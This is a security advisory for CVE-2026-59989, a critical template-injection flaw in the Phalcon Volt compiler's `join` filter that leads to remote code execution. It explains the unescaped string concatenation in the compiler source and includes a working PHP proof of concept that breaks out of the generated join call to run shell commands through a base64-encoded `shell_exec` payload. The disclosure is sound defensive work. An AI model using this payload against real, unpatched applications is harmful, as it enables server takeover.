# [C] Phalcon Volt compiler `join` filter compile-time PHP code injection (SSTI leads to RCE)

## Summary
Severity: Critical
Advisory: GHSA-hrwp-4hh9-c8r8
CVE: CVE-2026-59989
CWE: CWE-94, CWE-1336
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-21
Source: https://github.com/advisories/GHSA-hrwp-4hh9-c8r8
Type: github-advisory

## Affected
- Packagist: `phalcon/cphalcon` — affected >=0 <5.16.0

## Details
## Summary

The Volt template compiler in Phalcon generates the PHP for the `join` filter by string-concatenating the filter's **raw template-literal argument bytes** with no escaping. The separator literal is dropped verbatim between two single quotes the compiler emits, and the piped array argument is emitted completely bare. A Volt template whose `join` arguments are attacker-influenced can therefore break out of the generated `join('…')` call and inject arbitrary PHP into the compiled template. Volt writes that compiled template to a cache file and `require()`s it at render time, so the injected PHP executes i.e. compile-time PHP code injection (server-side template injection -> remote code execution) for any application that compiles attacker-controlled Volt source.

## Details 

### Root cause

`phalcon/Mvc/View/Engine/Volt/Compiler.zep:2544-2546`:

```zephir
case "join":
    return "join('" . funcArguments[1]["expr"]["value"]
        . "', " . funcArguments[0]["expr"]["value"] . ")";
```

`funcArguments[1]["expr"]["value"]` (the separator) and `funcArguments[0]["expr"]["value"]` (the piped array) are the **raw values** of the parsed template tokens. Unlike every other expression in the compiler, they are **not** routed through `expression()` and receive no escaping: the separator value is spliced verbatim inside the `join('` … `'` quotes with no neutralisation of `'`, and the array value is emitted with no quoting at all. Volt's scanner stores string-literal bytes verbatim (escape sequences are not decoded), so attacker bytes survive intact into the generated PHP.

**Generated-C ground truth** -> `build/phalcon/phalcon.zep.c` (Phalcon 5.15.0):

```c
ZEPHIR_CONCAT_SVSVS(return_value, "join('", &_19$$24, "', ", &_22$$24, ")");
```

i.e. literally `"join('" + separator + "', " + array + ")"` with both attacker-controlled fragments unescaped.

The compiled output is then written to a cache file and `require`d by `Phalcon\Mvc\View\Engine\Volt::render()`, so any PHP spliced in by the attacker runs at render time.

## PoC 

```php
<?php
use Phalcon\Mvc\View\Engine\Volt\Compiler;

$cmd = 'id; uname -a; hostname';

$b64 = base64_encode($cmd);
$tpl = "{{ ['x'] | join(\"',[]); echo shell_exec(base64_decode('$b64')); //\") }}";

$compiled = (new Compiler())->compileString($tpl);

$f = tempnam(sys_get_temp_dir(), 'volt') . '.php';
file_put_contents($f, $compiled);
include $f;
unlink($f);

```

<img width="1226" height="386" alt="image" src="https://github.com/user-attachments/assets/4d5da3f4-0bc9-41d9-b741-13c9ea9b08fe" />





## Impact

Where an application compiles Volt source that is wholly or partly attacker-controlled, this yields **remote code execution** in the web-server process.

## References
- https://github.com/phalcon/cphalcon/security/advisories/GHSA-hrwp-4hh9-c8r8
- https://nvd.nist.gov/vuln/detail/CVE-2026-59989
- https://github.com/phalcon/cphalcon/pull/17217
- https://github.com/phalcon/cphalcon/commit/e434061be3b7161930476c1368c868badc71e1bd
- https://github.com/phalcon/cphalcon
- https://github.com/phalcon/cphalcon/releases/tag/v5.16.0
